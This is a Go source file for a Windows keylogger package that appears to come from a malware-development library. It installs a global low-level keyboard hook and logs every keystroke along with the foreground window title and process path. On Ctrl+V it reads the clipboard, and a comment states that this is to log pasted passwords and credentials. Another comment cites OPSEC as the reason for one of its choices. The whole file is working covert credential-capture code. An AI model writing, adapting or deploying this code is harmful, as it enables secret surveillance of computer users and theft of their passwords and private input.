//go:build windows

package keylog

import (
	"context"
	"runtime"
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// Event represents a captured keystroke with full context.
type Event struct {
	KeyCode   int       // Virtual key code (VK_*)
	Character string    // Translated character, or label like [Enter], [Backspace]
	Ctrl      bool      // Ctrl modifier was held
	Shift     bool      // Shift modifier was held
	Alt       bool      // Alt modifier was held
	Clipboard string    // Clipboard text (populated only on Ctrl+V)
	Window    string    // Foreground window title
	Process   string    // Foreground process executable path
	Time      time.Time // Capture timestamp
}

// kbdllHookStruct mirrors the Win32 KBDLLHOOKSTRUCT layout.
type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

const (
	whKeyboardLL = 13
	wmKeydown    = 0x0100
	wmKeyup      = 0x0101
	wmSyskeydown = 0x0104
	wmSyskeyup   = 0x0105
)

// Virtual key codes for modifier and special key detection.
const (
	vkBack      = 0x08
	vkTab       = 0x09
	vkReturn    = 0x0D
	vkShift     = 0x10
	vkControl   = 0x11
	vkMenu      = 0x12 // Alt
	vkPause     = 0x13
	vkCapital   = 0x14
	vkEscape    = 0x1B
	vkSpace     = 0x20
	vkPageUp    = 0x21
	vkPageDown  = 0x22
	vkEnd       = 0x23
	vkHome      = 0x24
	vkLeft      = 0x25
	vkUp        = 0x26
	vkRight     = 0x27
	vkDown      = 0x28
	vkPrtSc     = 0x2C
	vkInsert    = 0x2D
	vkDelete    = 0x2E
	vkLWin      = 0x5B
	vkRWin      = 0x5C
	vkNumLock   = 0x90
	vkScrollLck = 0x91
	vkLShift    = 0xA0
	vkRShift    = 0xA1
	vkLControl  = 0xA2
	vkRControl  = 0xA3
	vkLMenu     = 0xA4
	vkRMenu     = 0xA5
)

// Proc references for APIs not available in x/sys/windows.
var (
	procSetWindowsHookExW        = api.User32.NewProc("SetWindowsHookExW")
	procCallNextHookEx           = api.User32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx      = api.User32.NewProc("UnhookWindowsHookEx")
	procGetMessageW              = api.User32.NewProc("GetMessageW")
	procGetForegroundWindow      = api.User32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = api.User32.NewProc("GetWindowTextW")
	procGetWindowThreadProcessID = api.User32.NewProc("GetWindowThreadProcessId")
	procGetKeyboardState         = api.User32.NewProc("GetKeyboardState")
	procGetKeyboardLayout        = api.User32.NewProc("GetKeyboardLayout")
	procToUnicodeEx              = api.User32.NewProc("ToUnicodeEx")
	procPostThreadMessageW       = api.User32.NewProc("PostThreadMessageW")
	procGetAsyncKeyState         = api.User32.NewProc("GetAsyncKeyState")
	procAttachThreadInput        = api.User32.NewProc("AttachThreadInput")
	procOpenClipboard            = api.User32.NewProc("OpenClipboard")
	procCloseClipboard           = api.User32.NewProc("CloseClipboard")
	procGetClipboardData         = api.User32.NewProc("GetClipboardData")
	procGlobalLock               = api.Kernel32.NewProc("GlobalLock")
	procGlobalUnlock             = api.Kernel32.NewProc("GlobalUnlock")
)

// hookState holds per-session state shared between the message loop
// goroutine and the hook callback.
type hookState struct {
	ch     chan Event
	handle uintptr
	// Cached foreground window to avoid re-querying process info on every
	// keystroke when the active window hasn't changed.
	cachedHwnd    uintptr
	cachedTitle   string
	cachedProcess string
}

// globalState is process-wide because SetWindowsHookExW requires a
// plain function pointer — closures cannot be passed as HOOKPROC.
// atomic.Pointer avoids mutex contention inside the hook callback,
// which runs on the message loop thread with strict OS timing constraints.
var globalState atomic.Pointer[hookState]

// Start installs a low-level keyboard hook and returns a channel that
// receives keystroke events. The hook runs until the context is
// cancelled. The channel is closed when the hook is removed.
//
// Each Event includes the translated character (with special key labels
// like [Enter], [Backspace], [Tab], etc.), modifier state (Ctrl/Shift/Alt),
// and clipboard content on Ctrl+V paste detection.
func Start(ctx context.Context) (<-chan Event, error) {
	ch := make(chan Event, 128)
	st := &hookState{ch: ch}
	if !globalState.CompareAndSwap(nil, st) {
		return nil, ErrAlreadyRunning
	}

	ready := make(chan error, 1)

	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		cb := windows.NewCallback(hookProc)
		r, _, err := procSetWindowsHookExW.Call(
			whKeyboardLL,
			cb,
			0, // hMod=0 for global LL hook
			0, // dwThreadId=0 captures all threads
		)
		if r == 0 {
			globalState.Store(nil)
			ready <- err
			close(ch)
			return
		}

		st.handle = r
		ready <- nil

		tid := windows.GetCurrentThreadId()

		go func() {
			<-ctx.Done()
			procPostThreadMessageW.Call(uintptr(tid), 0x0012, 0, 0) //nolint:errcheck
		}()

		// Standard Win32 message pump — required for LL hooks.
		var msg [48]byte
		for {
			ret, _, _ := procGetMessageW.Call(
				uintptr(unsafe.Pointer(&msg[0])),
				0, 0, 0,
			)
			if ret == 0 || int32(ret) == -1 {
				break
			}
		}

		procUnhookWindowsHookEx.Call(r) //nolint:errcheck
		globalState.Store(nil)
		close(ch)
	}()

	if err := <-ready; err != nil {
		return nil, err
	}
	return ch, nil
}

// hookProc is the HOOKPROC callback for WH_KEYBOARD_LL.
func hookProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && (wParam == wmKeydown || wParam == wmSyskeydown) {
		kb := (*kbdllHookStruct)(unsafe.Pointer(lParam))
		vk := kb.VkCode

		// Skip bare modifier key-down events (they are tracked as flags).
		if isModifierKey(vk) {
			goto next
		}

		// Read modifier state via GetAsyncKeyState — works from any thread,
		// unlike GetKeyState which is thread-local.
		ctrl := asyncKeyDown(vkControl)
		shift := asyncKeyDown(vkShift)
		alt := asyncKeyDown(vkMenu)

		{
			ev := Event{
				KeyCode: int(vk),
				Ctrl:    ctrl,
				Shift:   shift,
				Alt:     alt,
				Time:    time.Now(),
			}

			// Detect common Ctrl shortcuts before translating.
			if ctrl && !alt {
				if label := ctrlShortcut(vk); label != "" {
					ev.Character = label
					if vk == 'V' || vk == 'v' {
						ev.Clipboard = readClipboardText()
					}
					fillWindow(&ev)
					send(&ev)
					goto next
				}
			}

			// Label non-printable keys.
			if label := specialKeyLabel(vk); label != "" {
				ev.Character = label
				fillWindow(&ev)
				send(&ev)
				goto next
			}

			// Translate printable character via ToUnicodeEx.
			hwnd, _, _ := procGetForegroundWindow.Call()
			ev.Character = translateKey(vk, kb.ScanCode, kb.Flags, hwnd)
			fillWindow(&ev)
			send(&ev)
		}
	}

next:
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

// send pushes an event to the channel without blocking.
func send(ev *Event) {
	st := globalState.Load()
	if st == nil {
		return
	}
	select {
	case st.ch <- *ev:
	default:
	}
}

// fillWindow populates the Window and Process fields using a cached
// foreground window lookup. Only re-queries when the hwnd changes.
func fillWindow(ev *Event) {
	st := globalState.Load()
	if st == nil {
		return
	}

	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == st.cachedHwnd && st.cachedHwnd != 0 {
		ev.Window = st.cachedTitle
		ev.Process = st.cachedProcess
		return
	}

	title, process := resolveWindow(hwnd)
	st.cachedHwnd = hwnd
	st.cachedTitle = title
	st.cachedProcess = process
	ev.Window = title
	ev.Process = process
}

// isModifierKey returns true for keys that are tracked as flags, not characters.
func isModifierKey(vk uint32) bool {
	switch vk {
	case vkShift, vkLShift, vkRShift,
		vkControl, vkLControl, vkRControl,
		vkMenu, vkLMenu, vkRMenu:
		return true
	}
	return false
}

// asyncKeyDown checks if a key is currently pressed via GetAsyncKeyState.
// Bit 15 of the return value indicates the key is down.
func asyncKeyDown(vk uint32) bool {
	r, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return r&0x8000 != 0
}

// specialKeyLabel returns a bracketed label for non-printable keys.
func specialKeyLabel(vk uint32) string {
	switch vk {
	case vkReturn:
		return "[Enter]"
	case vkBack:
		return "[Backspace]"
	case vkTab:
		return "[Tab]"
	case vkEscape:
		return "[Esc]"
	case vkSpace:
		return " "
	case vkDelete:
		return "[Delete]"
	case vkInsert:
		return "[Insert]"
	case vkHome:
		return "[Home]"
	case vkEnd:
		return "[End]"
	case vkPageUp:
		return "[PageUp]"
	case vkPageDown:
		return "[PageDown]"
	case vkLeft:
		return "[Left]"
	case vkRight:
		return "[Right]"
	case vkUp:
		return "[Up]"
	case vkDown:
		return "[Down]"
	case vkPrtSc:
		return "[PrtSc]"
	case vkPause:
		return "[Pause]"
	case vkCapital:
		return "[CapsLock]"
	case vkNumLock:
		return "[NumLock]"
	case vkScrollLck:
		return "[ScrollLock]"
	case vkLWin, vkRWin:
		return "[Win]"
	}
	// F1-F12 (VK_F1=0x70 .. VK_F12=0x7B)
	if vk >= 0x70 && vk <= 0x7B {
		return "[F" + itoa(int(vk-0x70+1)) + "]"
	}
	return ""
}

// ctrlShortcut returns a label for common Ctrl+key combinations.
func ctrlShortcut(vk uint32) string {
	switch vk {
	case 'A', 'a':
		return "[Ctrl+A]"
	case 'C', 'c':
		return "[Ctrl+C]"
	case 'V', 'v':
		return "[Ctrl+V]"
	case 'X', 'x':
		return "[Ctrl+X]"
	case 'Z', 'z':
		return "[Ctrl+Z]"
	case 'Y', 'y':
		return "[Ctrl+Y]"
	case 'S', 's':
		return "[Ctrl+S]"
	case 'F', 'f':
		return "[Ctrl+F]"
	}
	return ""
}

// translateKey converts a virtual key code to a Unicode character string
// using the foreground window's keyboard layout.
func translateKey(vkCode, scanCode, flags uint32, hwnd uintptr) string {
	var keyState [256]byte

	// Attach to the foreground window's thread to get accurate keyboard
	// state (modifier keys, CapsLock, etc.). Without this, GetKeyboardState
	// returns the hook thread's state which doesn't reflect the user's
	// actual modifier keys.
	var fgTID uint32
	if hwnd != 0 {
		tid, _, _ := procGetWindowThreadProcessID.Call(hwnd, 0)
		fgTID = uint32(tid)
	}
	hookTID := windows.GetCurrentThreadId()

	attached := false
	if fgTID != 0 && fgTID != hookTID {
		r, _, _ := procAttachThreadInput.Call(
			uintptr(hookTID), uintptr(fgTID), 1,
		)
		attached = r != 0
	}

	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0]))) //nolint:errcheck

	if attached {
		procAttachThreadInput.Call(
			uintptr(hookTID), uintptr(fgTID), 0,
		) //nolint:errcheck
	}

	hkl, _, _ := procGetKeyboardLayout.Call(uintptr(fgTID))

	var buf [8]uint16
	sc := scanCode
	if flags&0x80 != 0 {
		sc |= 0x8000
	}
	// wFlags=0x4 prevents ToUnicodeEx from modifying the kernel keyboard
	// state, preserving dead key sequences (OPSEC). Win10 1607+.
	ret, _, _ := procToUnicodeEx.Call(
		uintptr(vkCode),
		uintptr(sc),
		uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0x4,
		hkl,
	)
	n := int(int32(ret))
	if n > 0 {
		return windows.UTF16ToString(buf[:n])
	}
	return ""
}

// readClipboardText captures the current clipboard text content.
// Called on Ctrl+V to log pasted passwords and credentials.
func readClipboardText() string {
	const cfUnicodeText = 13
	r, _, _ := procOpenClipboard.Call(0)
	if r == 0 {
		return ""
	}
	defer procCloseClipboard.Call() //nolint:errcheck

	h, _, _ := procGetClipboardData.Call(cfUnicodeText)
	if h == 0 {
		return ""
	}

	ptr, _, _ := procGlobalLock.Call(h)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlock.Call(h) //nolint:errcheck

	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
}

// resolveWindow returns the title and process path of a window handle.
func resolveWindow(hwnd uintptr) (title, process string) {
	if hwnd == 0 {
		return "", ""
	}

	var buf [256]uint16
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf))) //nolint:errcheck
	title = windows.UTF16ToString(buf[:])

	var pid uint32
	procGetWindowThreadProcessID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	if pid == 0 {
		return title, ""
	}

	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return title, ""
	}
	defer windows.CloseHandle(h) //nolint:errcheck

	var nameBuf [windows.MAX_PATH]uint16
	nameLen := uint32(len(nameBuf))
	if windows.QueryFullProcessImageName(h, 0, &nameBuf[0], &nameLen) == nil {
		process = windows.UTF16ToString(nameBuf[:nameLen])
	}
	return title, process
}

// itoa converts a small int to string without importing strconv.
func itoa(n int) string {
	if n < 10 {
		return string(rune('0' + n))
	}
	return string(rune('0'+n/10)) + string(rune('0'+n%10))
}
